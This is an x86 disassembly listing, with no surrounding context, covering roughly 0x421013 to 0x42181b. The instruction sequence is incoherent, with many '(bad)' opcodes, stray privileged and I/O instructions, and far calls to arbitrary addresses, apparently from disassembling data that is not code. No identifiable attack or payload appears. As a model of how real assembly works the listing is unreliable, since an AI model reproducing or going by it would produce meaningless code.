  421013:	and    DWORD PTR [esi],ecx
  421015:	xlat   BYTE PTR ds:[ebx]
  421016:	dec    esi
  421017:	xor    al,0xd6
  421019:	(bad)  
  42101a:	cmp    DWORD PTR ds:0x3e1a689d,esp
  421020:	fstp   TBYTE PTR [ecx+0x8232f82]
  421026:	sbb    BYTE PTR [esi-0x56],bl
  421029:	mov    ds,WORD PTR [edx-0x68]
  42102c:	iret   
  42102d:	jno    0x421095
  42102f:	ds ret 0xb2ef
  421033:	or     eax,0x74d99122
  421038:	cmp    edx,eax
  42103a:	pop    edx
  42103b:	nop
  42103c:	jecxz  0x420fd4
  42103e:	inc    esi
  42103f:	popa   
  421040:	push   esp
  421041:	hlt    
  421042:	lods   eax,DWORD PTR ds:[esi]
  421043:	in     al,dx
  421044:	xor    al,0xff
  421046:	sbb    esi,0xf585ce37
  42104c:	sub    ch,BYTE PTR [esi+0x9aea6b2]
  421052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421053:	pop    ss
  421054:	inc    ebx
  421055:	dec    ebp
  421056:	rol    ch,cl
  421058:	fist   DWORD PTR [ebx]
  42105a:	fsubr  QWORD PTR [edi]
  42105c:	fidiv  WORD PTR [esi+0x6d]
  42105f:	adc    ah,al
  421061:	or     BYTE PTR [edi+0x4b],dh
  421064:	(bad)  
  421065:	fsubrp st(7),st
  421067:	mov    ch,0xa8
  421069:	jno    0x420fff
  42106b:	(bad)  
  42106c:	cmp    BYTE PTR [eax+edx*2+0x1e],al
  421070:	and    ebx,ebp
  421072:	sbb    edi,DWORD PTR [esi]
  421074:	in     eax,0xcc
  421076:	shl    DWORD PTR [eax-0x31c03217],1
  42107c:	mov    esp,0x836f12f9
  421081:	fisubr WORD PTR [ecx]
  421083:	xor    eax,0x2724f40f
  421088:	pop    esp
  421089:	push   es
  42108a:	mov    ds:0xd9d09787,eax
  42108f:	iret   
  421090:	mov    ah,0xa8
  421092:	mov    dl,0x2
  421094:	add    cl,dh
  421096:	retf   0x2485
  421099:	mov    al,0x50
  42109b:	mov    bl,0x32
  42109d:	jae    0x42105b
  42109f:	pusha  
  4210a0:	divps  xmm3,XMMWORD PTR [esi+ecx*1-0x6d7c712d]
  4210a8:	xchg   ebp,eax
  4210a9:	retf   
  4210aa:	sub    DWORD PTR [ecx-0x3f518e74],ecx
  4210b0:	(bad)  
  4210b1:	or     al,BYTE PTR [esi+0x7c]
  4210b4:	inc    edx
  4210b5:	push   esi
  4210b6:	pop    eax
  4210b7:	cmp    eax,0x892cfe0d
  4210bc:	adc    cl,BYTE PTR [esi+0x52]
  4210bf:	mov    cl,0x20
  4210c1:	scas   al,BYTE PTR es:[edi]
  4210c2:	and    BYTE PTR [edi-0x18e418fd],0x19
  4210c9:	(bad)  
  4210cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210cc:	ss or  al,0x29
  4210cf:	cmp    cl,BYTE PTR [edi-0x5a01ff74]
  4210d5:	aad    0x5d
  4210d7:	sub    DWORD PTR [ebx],0x1f
  4210da:	jp     0x421123
  4210dc:	mov    dh,0x1f
  4210de:	cmc    
  4210df:	jge    0x42106f
  4210e1:	in     al,0xd
  4210e3:	imul   ebx,esp,0x6d
  4210e6:	and    al,0xb5
  4210e8:	mov    eax,0xff1bda1a
  4210ed:	int    0x8
  4210ef:	test   al,0x3e
  4210f1:	dec    esp
  4210f2:	sub    eax,0xe109f6af
  4210f7:	inc    esi
  4210f8:	test   ebx,ebx
  4210fa:	imul   ecx,DWORD PTR cs:[ebx+0x40],0xeae80c3f
  421102:	mov    edx,ecx
  421104:	leave  
  421105:	leave  
  421106:	inc    eax
  421107:	call   0x8b49:0x76f618da
  42110e:	ror    ecx,cl
  421110:	cmp    ecx,edx
  421112:	fsub   QWORD PTR [ecx-0x4b]
  421115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421116:	les    ecx,FWORD PTR [esi]
  421118:	mov    dl,0x6d
  42111a:	xchg   ebx,eax
  42111b:	push   esp
  42111c:	xor    eax,0x749acfb6
  421121:	xor    DWORD PTR [ecx+0x4f02358f],ebp
  421127:	inc    edi
  421128:	jns    0x421129
  42112a:	add    BYTE PTR [eax+0x4817ae6f],bl
  421130:	loopne 0x42118b
  421132:	hlt    
  421133:	loopne 0x42115a
  421135:	adc    edx,DWORD PTR [edi-0x6e]
  421138:	stos   DWORD PTR es:[edi],eax
  421139:	xor    esp,DWORD PTR [edi+ebp*1-0x38c99812]
  421140:	lock leave 
  421142:	mov    dh,0x8a
  421144:	jnp    0x4211a9
  421146:	add    al,0x9a
  421148:	cli    
  421149:	inc    edi
  42114a:	in     eax,0x29
  42114c:	fwait
  42114d:	cmp    BYTE PTR [eax+0x26],ah
  421150:	dec    edi
  421151:	pop    edx
  421152:	mov    al,BYTE PTR [eax-0x2]
  421155:	daa    
  421156:	adc    dh,BYTE PTR [edx-0x780ade70]
  42115c:	xchg   esi,eax
  42115d:	stc    
  42115e:	sub    eax,0xfbfafe32
  421163:	cmp    DWORD PTR ds:0x675a3974,eax
  421169:	push   0xd3bdf317
  42116e:	icebp  
  42116f:	stc    
  421170:	adc    dl,al
  421172:	test   DWORD PTR ds:0x48478448,0xd691a8e4
  42117c:	jg     0x42110e
  42117e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42117f:	(bad)
  421182:	lds    ecx,FWORD PTR [ecx+0x147f5dcd]
  421188:	mov    eax,ds:0x27538578
  42118d:	cmp    BYTE PTR [ebx+ebx*2+0x78],dh
  421191:	mov    ds:0xd3d0435,al
  421196:	add    eax,0x63f52a73
  42119b:	stc    
  42119c:	xchg   edx,eax
  42119d:	fsub   st(1),st
  42119f:	shl    BYTE PTR [edi+0x5],cl
  4211a2:	xor    eax,0xd82994fb
  4211a7:	pop    esp
  4211a8:	enter  0x5046,0xd4
  4211ac:	repnz sbb dl,ah
  4211af:	mov    bh,dh
  4211b1:	mov    edx,0x975dbbbd
  4211b6:	inc    edi
  4211b7:	mov    ch,0xd3
  4211b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ba:	sub    al,BYTE PTR [eax]
  4211bc:	iret   
  4211bd:	cmovb  eax,DWORD PTR [eax+eiz*4-0x62]
  4211c2:	dec    ebp
  4211c3:	mov    ebp,0x4155af3b
  4211c8:	fsub   DWORD PTR [edi-0x5d64cb32]
  4211ce:	sub    al,0x69
  4211d0:	lds    esp,FWORD PTR [eax-0x5df3a67b]
  4211d6:	sub    al,0x32
  4211d8:	push   edx
  4211d9:	inc    ecx
  4211da:	sbb    ah,BYTE PTR [ecx-0x3f9d28c8]
  4211e0:	lea    ecx,[edx+0x23]
  4211e3:	fcomip st,st(3)
  4211e5:	mov    eax,ds:0x8446ec89
  4211ea:	add    BYTE PTR [edi-0x28db29d],bl
  4211f0:	jle    0x4211b1
  4211f2:	out    dx,eax
  4211f3:	sbb    edi,esp
  4211f5:	mov    BYTE PTR [eax+ebp*2-0x63c680be],dh
  4211fc:	call   0x0:0x1e70001
  421203:	mov    ch,0x88
  421205:	outs   dx,BYTE PTR ds:[esi]
  421206:	lea    edx,[ebx-0x4900a5c1]
  42120c:	call   0xcd3c:0xb5fcfd27
  421213:	loopne 0x42127c
  421215:	loop   0x421227
  421217:	mov    bl,0x91
  421219:	mov    esp,0x3052240a
  42121e:	pop    esp
  42121f:	in     al,0xe8
  421221:	stos   BYTE PTR es:[edi],al
  421222:	(bad)  
  421223:	jae    0x421267
  421225:	sbb    BYTE PTR [ecx+0x477af630],ch
  42122b:	xchg   ecx,eax
  42122c:	ror    DWORD PTR [edi+0x6d93bedb],0x33
  421233:	sub    eax,0xeb05a271
  421238:	inc    edx
  421239:	mov    eax,ds:0xe64eb783
  42123e:	push   esp
  42123f:	cmp    eax,0xb009a479
  421244:	or     eax,0x3b50360a
  421249:	stos   DWORD PTR es:[edi],eax
  42124a:	addr16 mov esi,0x4e63018f
  421250:	in     eax,dx
  421251:	add    DWORD PTR [ecx],ecx
  421253:	adc    eax,esi
  421255:	aas    
  421256:	mov    esi,0xbc516ae1
  42125b:	mov    esp,0x7f7733c8
  421260:	stos   BYTE PTR es:[edi],al
  421261:	(bad)
  421265:	push   0x817cc0cd
  42126a:	cmp    DWORD PTR [ebx],edx
  42126c:	je     0x421244
  42126e:	ds stc 
  421270:	push   esp
  421271:	xor    esi,DWORD PTR [edi+0x63]
  421274:	xchg   esi,eax
  421275:	mov    al,0x87
  421277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421278:	or     ah,ah
  42127a:	mov    edx,0x74831706
  42127f:	call   0xf5e276cf
  421284:	push   ebx
  421285:	xor    ebx,DWORD PTR [ebx]
  421287:	and    ch,BYTE PTR [ebx]
  421289:	out    dx,al
  42128a:	inc    ebp
  42128b:	add    al,dl
  42128d:	jl     0x421223
  42128f:	xor    bh,BYTE PTR [ebx-0x6adea9b2]
  421295:	xor    al,BYTE PTR [edi+eiz*1-0x3d]
  421299:	and    DWORD PTR [edx+edi*8+0x37e1e81d],ebp
  4212a0:	mov    dl,0x56
  4212a2:	and    al,0xf4
  4212a4:	and    BYTE PTR [eax+0x4c195c13],ch
  4212aa:	adc    edx,DWORD PTR [ebx-0x6b]
  4212ad:	inc    ebx
  4212ae:	mov    ss,WORD PTR [edi+0x2e]
  4212b1:	push   0x48
  4212b3:	inc    esi
  4212b4:	sbb    ah,BYTE PTR [ecx+0x2c]
  4212b7:	cmp    edx,ecx
  4212b9:	jp     0x421327
  4212bb:	pop    ss
  4212bc:	xchg   ebx,eax
  4212bd:	int    0x18
  4212bf:	ds jmp 0xf8bb6eaf
  4212c5:	outs   dx,DWORD PTR ds:[esi]
  4212c6:	sbb    ch,BYTE PTR [esi-0x5f46f5b8]
  4212cc:	inc    ebp
  4212cd:	mov    dh,0x5
  4212cf:	jge    0x4212f0
  4212d1:	or     ebx,ebx
  4212d3:	jne    0x4212a5
  4212d5:	and    eax,eax
  4212d7:	xchg   DWORD PTR [eax],esi
  4212d9:	sti    
  4212da:	mov    eax,ds:0x41d90f6f
  4212df:	sbb    DWORD PTR gs:[ecx],ecx
  4212e2:	sbb    edi,DWORD PTR [ebx+0x6c]
  4212e5:	(bad)  
  4212e6:	sti    
  4212e7:	xlat   BYTE PTR ds:[ebx]
  4212e8:	or     BYTE PTR [ebx+esi*2-0x5a],0x56
  4212ed:	or     edi,edx
  4212ef:	daa    
  4212f0:	sahf   
  4212f1:	out    0x4d,eax
  4212f3:	sbb    bh,BYTE PTR [edi+eiz*4+0x334b195a]
  4212fa:	ss mov bl,0xf
  4212fd:	mov    dl,0x2d
  4212ff:	lds    ebx,FWORD PTR [ebx+0xb155410]
  421305:	out    dx,al
  421306:	int3   
  421307:	ins    DWORD PTR es:[edi],dx
  421308:	repz and al,0x9e
  42130b:	(bad)  
  42130c:	sub    eax,0xee9dbaf
  421311:	leave  
  421312:	dec    DWORD PTR [esi]
  421314:	jle    0x4212d4
  421316:	sbb    BYTE PTR [esi+0x57],bh
  421319:	add    eax,0xb8c7fc23
  42131e:	jge    0x421328
  421320:	jle    0x421342
  421322:	or     ch,BYTE PTR [esi]
  421324:	sar    BYTE PTR [ebp*8-0x4ace090],1
  42132b:	xor    BYTE PTR [ecx-0x5eaa8a73],al
  421331:	xor    dl,BYTE PTR [edx]
  421333:	sahf   
  421334:	or     ecx,esp
  421336:	jno    0x4212bd
  421338:	mov    esp,0xe0095450
  42133d:	jne    0x4213a2
  42133f:	mov    cl,0xe9
  421341:	stc    
  421342:	fcomip st,st(7)
  421344:	mov    ds:0x57758997,eax
  421349:	imul   DWORD PTR [esi]
  42134b:	dec    eax
  42134c:	(bad)  
  42134d:	mov    edx,0x40942ee3
  421352:	lds    esp,FWORD PTR [edi+ebp*4-0x2d38a58f]
  421359:	cmc    
  42135a:	(bad)  
  42135b:	aad    0x30
  42135d:	mov    eax,ds:0x70fafefa
  421362:	push   edx
  421363:	jle    0x421328
  421365:	jae    0x42130b
  421367:	icebp  
  421368:	xchg   esi,eax
  421369:	test   DWORD PTR [edx],ebp
  42136b:	loop   0x42136a
  42136d:	cs jae 0x42131c
  421370:	xchg   edi,eax
  421371:	fnsave [esi+0xa]
  421374:	and    edx,DWORD PTR [ecx-0x31]
  421377:	ret    0x23a5
  42137a:	loopne 0x42133d
  42137c:	pop    edx
  42137d:	out    0xc1,al
  42137f:	xchg   edi,eax
  421380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421381:	dec    eax
  421382:	loopne 0x4213a7
  421384:	outs   dx,BYTE PTR ds:[esi]
  421385:	jno    0x421382
  421387:	cld    
  421388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421389:	or     bh,ch
  42138b:	cli    
  42138c:	mov    esi,0x7af1e29c
  421391:	or     ch,BYTE PTR [ebx-0x459cfcdc]
  421397:	shl    BYTE PTR [esi+0x53],cl
  42139a:	pushf  
  42139b:	or     BYTE PTR [ebx-0x3bafaeeb],0x4d
  4213a2:	jns    0x4213ea
  4213a4:	add    bh,ch
  4213a6:	(bad)  
  4213a7:	push   cs
  4213a8:	jno    0x421340
  4213aa:	sar    DWORD PTR [ebx],0xba
  4213ad:	retf   0xa85f
  4213b0:	inc    edi
  4213b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213b2:	push   edi
  4213b3:	(bad)  
  4213b4:	and    DWORD PTR [esi],eax
  4213b6:	outs   dx,DWORD PTR ds:[esi]
  4213b7:	mov    edx,ss
  4213b9:	cs inc edi
  4213bb:	out    0x31,al
  4213bd:	test   dl,ch
  4213bf:	mov    dh,0xbc
  4213c1:	pop    ds
  4213c2:	call   0x8dc3:0x8d41dba4
  4213c9:	mov    esi,ds
  4213cb:	cmp    BYTE PTR [eax-0x33f81fe3],ch
  4213d1:	sub    ah,BYTE PTR [edi+ebx*2]
  4213d4:	sbb    ah,dl
  4213d6:	sub    BYTE PTR [ebx],ch
  4213d8:	mov    BYTE PTR [edi],ch
  4213da:	shr    BYTE PTR [edx-0x11],cl
  4213dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213de:	jle    0x4213fc
  4213e0:	es dec esp
  4213e2:	mov    edi,0x9ba48f1f
  4213e7:	ja     0x42140d
  4213e9:	push   edi
  4213ea:	add    BYTE PTR [eax+0x23],dh
  4213ed:	and    eax,0x7c6f7769
  4213f2:	cmp    esp,DWORD PTR [eax+0x6bcee1c]
  4213f8:	mov    bl,dl
  4213fa:	xchg   edx,eax
  4213fb:	sbb    DWORD PTR [ecx+eax*1+0x1e700],0x0
  421403:	push   edi
  421404:	idiv   DWORD PTR es:[ecx]
  421407:	mov    ch,0x16
  421409:	test   esp,0xc99ac250
  42140f:	rol    DWORD PTR ds:0x7ab005cd,0x10
  421416:	or     DWORD PTR [edx+0x2e141123],ebp
  42141c:	clc    
  42141d:	mov    gs,WORD PTR [ebx-0x16]
  421420:	cs inc eax
  421422:	test   al,0x5f
  421424:	iret   
  421425:	cmp    dh,BYTE PTR fs:[edi]
  421428:	clc    
  421429:	adc    ecx,edi
  42142b:	lods   eax,DWORD PTR ds:[esi]
  42142c:	push   0xffffffec
  42142e:	test   BYTE PTR [ecx-0x24],0x7d
  421432:	dec    esi
  421433:	add    ax,0x248
  421437:	daa    
  421438:	and    al,0x55
  42143a:	icebp  
  42143b:	cmp    BYTE PTR [esi-0x29],bl
  42143e:	cwde   
  42143f:	add    BYTE PTR [esi-0x5fe5135e],ch
  421445:	enter  0x1978,0x59
  421449:	push   esp
  42144a:	scas   al,BYTE PTR es:[edi]
  42144b:	inc    edi
  42144c:	repz mov edx,0x4c933c6a
  421452:	aaa    
  421453:	push   esi
  421454:	bound  edx,QWORD PTR [ebx]
  421456:	stos   DWORD PTR es:[edi],eax
  421457:	mov    ebx,0x63cee690
  42145c:	xor    BYTE PTR [ebp+ebp*8+0x23],bh
  421460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421461:	and    al,0xe6
  421463:	les    esp,FWORD PTR [ecx+0x52a54cd3]
  421469:	call   0xc0d9:0xb830701c
  421470:	mov    al,ds:0x60f012c5
  421475:	mov    cl,BYTE PTR [ecx+eax*1-0x76]
  421479:	and    eax,0x46a15be9
  42147e:	scas   eax,DWORD PTR es:[edi]
  42147f:	div    DWORD PTR [edx+0x43c715fc]
  421485:	jle    0x4214cb
  421487:	dec    edi
  421488:	add    eax,0x3c9082e2
  42148d:	xor    DWORD PTR [ebx+0x36],ebx
  421490:	es in  al,0xcf
  421493:	jl     0x421453
  421495:	mov    edx,0xb0fd4c75
  42149a:	pop    es
  42149b:	mov    ds:0x531697ca,eax
  4214a0:	jbe    0x42149a
  4214a2:	cmp    eax,0x87ae2d5c
  4214a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214a8:	fsqrt  
  4214aa:	test   al,0xb8
  4214ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ad:	cmp    bl,BYTE PTR [edi]
  4214af:	scas   al,BYTE PTR es:[edi]
  4214b0:	fnsetpm(287 only) 
  4214b2:	stc    
  4214b3:	push   esp
  4214b4:	mov    WORD PTR [ebp-0x648b7b21],es
  4214ba:	arpl   WORD PTR [esi-0x6da80629],sp
  4214c0:	mov    DWORD PTR [edx-0x5a],eax
  4214c3:	in     eax,0xe7
  4214c5:	sub    eax,0xec714834
  4214ca:	adc    al,0x26
  4214cc:	mov    ebx,0x8419b0d6
  4214d1:	and    esp,DWORD PTR [edx+0xe72f658]
  4214d7:	scas   al,BYTE PTR es:[edi]
  4214d8:	loopne 0x42147b
  4214da:	and    bl,BYTE PTR [ebx]
  4214dc:	cmp    esi,eax
  4214de:	xchg   esi,eax
  4214df:	dec    ebx
  4214e0:	psubw  mm3,QWORD PTR [esi-0x79d73877]
  4214e7:	xchg   DWORD PTR [ebx-0x6df69918],edi
  4214ed:	ins    DWORD PTR es:[edi],dx
  4214ee:	rol    BYTE PTR [edx+0x10],0x30
  4214f2:	inc    edx
  4214f3:	dec    eax
  4214f4:	sbb    DWORD PTR [ebp-0x56],edx
  4214f7:	stos   DWORD PTR es:[edi],eax
  4214f8:	sahf   
  4214f9:	and    DWORD PTR [eax-0xab53461],0x6cb04c75
  421503:	cdq    
  421504:	jmp    0x3fb4d123
  421509:	inc    edx
  42150a:	mov    ecx,0x9236da7c
  42150f:	jge    0x4214e0
  421511:	in     al,0x75
  421513:	inc    ecx
  421514:	pop    ds
  421515:	fmul   QWORD PTR [ebx+0x78]
  421518:	stc    
  421519:	(bad)  
  42151a:	push   eax
  42151b:	mov    bh,0xee
  42151d:	jno    0x4214ea
  42151f:	push   0x138fe326
  421524:	mov    ah,0x5e
  421526:	nop
  421527:	scas   al,BYTE PTR es:[edi]
  421528:	pop    esp
  421529:	mov    eax,ds:0x21ae752a
  42152e:	add    edx,DWORD PTR [eax-0x2b]
  421531:	add    ecx,DWORD PTR [edx-0x2bea8ea]
  421537:	jmp    DWORD PTR [esi]
  421539:	enter  0x7ace,0x88
  42153d:	sahf   
  42153e:	sub    ah,cl
  421540:	out    0x1f,al
  421542:	xor    BYTE PTR [eax],cl
  421544:	aam    0x7a
  421546:	stos   BYTE PTR es:[edi],al
  421547:	pop    ds
  421548:	(bad)  
  421549:	retf   0x4df0
  42154c:	xchg   ecx,eax
  42154d:	gs inc ebx
  42154f:	adc    eax,0x8d3b6830
  421554:	mov    ?,WORD PTR [ebx+0x70]
  421557:	xor    al,0x14
  421559:	add    DWORD PTR [ecx+0x65],ebx
  42155c:	push   0x259b02ac
  421561:	push   edx
  421562:	cmp    al,0x5a
  421564:	inc    esp
  421565:	ss xchg esp,eax
  421567:	push   ss
  421568:	outs   dx,BYTE PTR ds:[esi]
  421569:	retf   0xefc3
  42156c:	pshufw mm2,QWORD PTR [eax+0x7dceb4cc],0xfe
  421574:	jmp    FWORD PTR [esi]
  421576:	mov    ah,0x15
  421578:	jbe    0x421546
  42157a:	cli    
  42157b:	push   ss
  42157c:	or     BYTE PTR [edx+0x4e178670],dl
  421582:	icebp  
  421583:	xchg   DWORD PTR [ebx],edi
  421585:	mov    ah,0x2f
  421587:	mov    cl,dh
  421589:	mov    ebx,0x460a0e67
  42158e:	repz retf 
  421590:	push   cs
  421591:	xlat   BYTE PTR cs:[ebx]
  421593:	dec    esp
  421594:	cwde   
  421595:	mov    BYTE PTR [eax+0x6e],dl
  421598:	push   ds
  421599:	ins    BYTE PTR es:[edi],dx
  42159a:	sub    DWORD PTR [edi-0x3512637e],edx
  4215a0:	xlat   BYTE PTR ds:[ebx]
  4215a1:	pop    esp
  4215a2:	fiadd  DWORD PTR [edx-0x418da753]
  4215a8:	xor    DWORD PTR [edx+0x56cca5d5],esi
  4215ae:	jns    0x421553
  4215b0:	int    0x8c
  4215b2:	loopne 0x4215a2
  4215b4:	jmp    0x10cf:0x4b13c990
  4215bb:	cs dec esi
  4215bd:	(bad)  
  4215be:	and    DWORD PTR [edi-0x700e01d6],0x7a
  4215c5:	es adc ah,al
  4215c8:	cmp    BYTE PTR ss:[edx-0x3eb11dbc],bl
  4215cf:	and    ah,BYTE PTR [ebp-0x65]
  4215d2:	pop    eax
  4215d3:	or     al,0x49
  4215d5:	mov    ah,0xe
  4215d7:	jbe    0x4215a8
  4215d9:	retf   0x9bf9
  4215dc:	shr    DWORD PTR es:[edi+0x65f42462],1
  4215e3:	and    BYTE PTR [eax-0x6a],bh
  4215e6:	hlt    
  4215e7:	and    DWORD PTR [ebp-0x6f6bff81],eax
  4215ed:	ffree  st(0)
  4215ef:	(bad)  
  4215f1:	popf   
  4215f2:	aam    0x57
  4215f4:	(bad)
  4215f8:	xchg   edx,eax
  4215f9:	out    dx,eax
  4215fa:	lea    ebp,[edx-0x62]
  4215fd:	add    DWORD PTR [eax],eax
  4215ff:	out    0x1,eax
  421601:	add    BYTE PTR [eax],al
  421603:	ins    BYTE PTR es:[edi],dx
  421604:	retf   
  421605:	gs dec edi
  421607:	outs   dx,BYTE PTR ds:[esi]
  421608:	push   0x42
  42160a:	in     eax,0xda
  42160c:	loop   0x4215cb
  42160e:	xchg   esi,eax
  42160f:	inc    ecx
  421610:	(bad)  
  421611:	or     eax,DWORD PTR [esi-0x57219a94]
  421617:	repnz sub bl,0x15
  42161b:	push   ecx
  42161c:	ds push ebp
  42161e:	minps  xmm6,XMMWORD PTR [ebp+0x4e]
  421622:	test   al,0xc9
  421624:	mov    ebp,0xd3dc7ef4
  421629:	push   cs
  42162a:	dec    esp
  42162b:	jge    0x421635
  42162d:	bound  ebx,QWORD PTR [edi+0x6c]
  421630:	stc    
  421631:	(bad)  
  421632:	and    BYTE PTR [esi+0x769d2086],ch
  421638:	call   0xe472746a
  42163d:	and    al,0xb1
  42163f:	icebp  
  421640:	add    DWORD PTR [esi],ecx
  421642:	jno    0x4215d8
  421644:	das    
  421645:	add    edi,DWORD PTR [esi+0x6c]
  421648:	dec    ebp
  421649:	gs stos BYTE PTR es:[edi],al
  42164b:	cwde   
  42164c:	out    0xd4,al
  42164e:	add    bl,BYTE PTR [esi-0x59910f10]
  421654:	ror    BYTE PTR [edx+ecx*2-0x4ce312a3],1
  42165b:	mov    edx,0x99d23d84
  421660:	mov    al,0x46
  421662:	jb     0x4216a4
  421664:	sar    DWORD PTR [eax-0x681f58ba],cl
  42166a:	inc    eax
  42166b:	sti    
  42166c:	sar    BYTE PTR [ecx+0xc022da4],1
  421672:	cmc    
  421673:	jmp    0x421681
  421675:	lea    eax,[eax+eiz*1+0x6a783526]
  42167c:	and    cl,dl
  42167e:	cwde   
  42167f:	lods   al,BYTE PTR ds:[esi]
  421680:	pop    es
  421681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421682:	aaa    
  421683:	mov    edi,0x2086a475
  421688:	adc    edx,DWORD PTR [ecx+0x5cc83ae4]
  42168e:	push   ebx
  42168f:	aad    0x1b
  421691:	call   0xfaf6:0xd9c8769
  421698:	pop    edx
  421699:	mov    edi,0x90c6d357
  42169e:	add    dh,BYTE PTR [edi+ebx*4-0x69]
  4216a2:	sbb    edx,DWORD PTR [esi+0x4f]
  4216a5:	xchg   ebp,eax
  4216a6:	jae    0x42170e
  4216a8:	outs   dx,BYTE PTR ds:[esi]
  4216a9:	(bad)  
  4216aa:	arpl   WORD PTR [edx+0x4e],cx
  4216ad:	ret    
  4216ae:	fucomp st(6)
  4216b0:	jnp    0x4216d3
  4216b2:	or     DWORD PTR [ecx+0x4b75a7e1],esi
  4216b8:	fadd   DWORD PTR [edx]
  4216ba:	scas   al,BYTE PTR es:[edi]
  4216bb:	and    bh,BYTE PTR [edx-0xb]
  4216be:	jnp    0x421736
  4216c0:	push   ebx
  4216c1:	ss test al,0x72
  4216c4:	in     al,dx
  4216c5:	sub    BYTE PTR [esi+0x59],bh
  4216c8:	push   ebp
  4216c9:	and    ebx,edx
  4216cb:	cwde   
  4216cc:	pop    ss
  4216cd:	in     eax,0x86
  4216cf:	mov    ecx,0x81c2f904
  4216d4:	cwde   
  4216d5:	xlat   BYTE PTR ds:[ebx]
  4216d6:	mov    cl,0x7f
  4216d8:	call   0x336d81b0
  4216dd:	not    DWORD PTR [ecx+0x3ba63616]
  4216e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216e4:	dec    edx
  4216e5:	popa   
  4216e6:	mov    WORD PTR [ebp+ecx*1+0x4c],fs
  4216ea:	sub    bl,al
  4216ec:	mov    dh,0xa9
  4216ee:	mov    al,ah
  4216f0:	fwait
  4216f1:	adc    dh,BYTE PTR [edx]
  4216f3:	push   ss
  4216f4:	mov    bh,0x48
  4216f6:	ret    
  4216f7:	push   cs
  4216f8:	retf   0x4a7f
  4216fb:	dec    esi
  4216fc:	ret    0x6e1f
  4216ff:	cli    
  421700:	sub    al,0xc0
  421702:	cmp    ebp,DWORD PTR [eax+0x3f]
  421705:	sub    DWORD PTR [ebp+0x56],ecx
  421708:	add    ebp,DWORD PTR [ebp-0x60]
  42170b:	cmp    ebp,ecx
  42170d:	mov    ebp,0x83b12884
  421712:	out    0x1a,al
  421714:	add    edi,DWORD PTR [ebx+0xd]
  421717:	and    bl,BYTE PTR [ebx-0x411c455a]
  42171d:	mov    ds:0x13c8ef91,al
  421722:	push   ebx
  421723:	neg    DWORD PTR [ebx-0x556f7a1d]
  421729:	pop    ss
  42172a:	or     ebx,edi
  42172c:	mov    esi,0x82b9ca39
  421731:	fwait
  421732:	xchg   edx,eax
  421733:	dec    ebx
  421734:	push   ecx
  421735:	fisub  WORD PTR [edx+ebx*1+0x16]
  421739:	inc    ebp
  42173a:	jb     0x4216c4
  42173c:	inc    ebx
  42173d:	xor    al,0xd6
  42173f:	adc    eax,0xecc65c73
  421744:	and    eax,0xd8413372
  421749:	in     eax,dx
  42174a:	mov    dh,0x27
  42174c:	jo     0x421784
  42174e:	test   BYTE PTR ds:0xe7a7a231,ch
  421754:	or     ecx,esp
  421756:	xchg   esp,eax
  421757:	in     al,0x32
  421759:	imul   esi,DWORD PTR [ecx-0x1de2e848],0xffffffd3
  421760:	shl    DWORD PTR [edi-0x4],0x18
  421764:	xchg   DWORD PTR [eax],eax
  421766:	push   cs
  421767:	cli    
  421768:	xchg   ebx,eax
  421769:	push   edx
  42176a:	daa    
  42176b:	(bad)  
  42176d:	mov    al,0xfa
  42176f:	sub    eax,0x5831d79a
  421774:	dec    edx
  421775:	mov    cl,0x5a
  421777:	cmp    eax,0x4e875b32
  42177c:	pop    ebx
  42177d:	shr    ch,cl
  42177f:	sub    BYTE PTR [ebx],cl
  421781:	cmp    eax,0x86c70d16
  421786:	cmp    al,0x67
  421788:	add    eax,0xa3140dff
  42178d:	xor    ebx,esp
  42178f:	jnp    0x4217c3
  421791:	adc    eax,0xc3a1ea11
  421796:	add    al,0xff
  421798:	call   0x816b:0x84d987ab
  42179f:	loopne 0x4217a1
  4217a1:	or     ebx,edi
  4217a3:	push   cs
  4217a4:	jle    0x4217ba
  4217a6:	out    dx,eax
  4217a7:	sub    al,BYTE PTR [edi]
  4217a9:	add    eax,0x9143b3f4
  4217ae:	cmp    BYTE PTR [ebp-0x96571ff],cl
  4217b4:	sbb    ch,ah
  4217b6:	mov    esi,0x15a7329
  4217bb:	stos   BYTE PTR es:[edi],al
  4217bc:	sub    DWORD PTR [edx-0x158d36e9],ecx
  4217c2:	or     ah,cl
  4217c4:	enter  0x4aef,0x13
  4217c8:	dec    DWORD PTR [edi]
  4217ca:	sbb    DWORD PTR [edx+0x7e],0x7204fffd
  4217d1:	cmp    eax,0xdc92e9e1
  4217d6:	enter  0x9fea,0x68
  4217da:	sub    BYTE PTR [eax],bh
  4217dc:	cmp    BYTE PTR [edi-0x40],ch
  4217df:	in     eax,0x1b
  4217e1:	popa   
  4217e2:	inc    ebp
  4217e3:	xchg   ebx,eax
  4217e4:	jnp    0x421798
  4217e6:	xor    DWORD PTR [eax-0x65],eax
  4217e9:	push   esp
  4217ea:	add    ah,dh
  4217ec:	mov    dl,0x32
  4217ee:	(bad)  
  4217ef:	jbe    0x4217c7
  4217f1:	hlt    
  4217f2:	mov    dl,0xb1
  4217f4:	and    al,0xfe
  4217f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217f7:	sub    WORD PTR [esi-0x3e],bx
  4217fb:	push   ecx
  4217fc:	mov    al,ds:0x1e70001
  421801:	add    BYTE PTR [eax],al
  421803:	(bad)  
  421804:	stos   DWORD PTR es:[edi],eax
  421805:	add    al,0xa7
  421807:	mov    esp,0xf1d1f132
  42180c:	xor    esi,eax
  42180e:	shufps xmm4,XMMWORD PTR [ecx-0x3b],0x63
  421813:	ret    0x2414
  421816:	(bad)
  421819:	aas    
  42181a:	fwait
  42181b:	xchg   edx,eax
